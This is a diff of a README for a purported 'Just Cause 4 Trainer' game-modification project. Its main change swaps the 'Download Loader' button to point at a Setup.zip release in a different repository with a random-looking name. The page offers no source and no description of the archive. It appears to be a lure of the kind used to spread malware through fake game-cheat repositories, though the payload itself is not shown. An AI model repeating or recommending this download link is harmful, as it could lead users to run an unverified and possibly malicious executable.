@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Just Cause 4 Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Just-Cause-4-Trainer` · Updated: 2026-11-02
 
 **Tags:** `just-cause-4` `just-cause` `open-world`
+
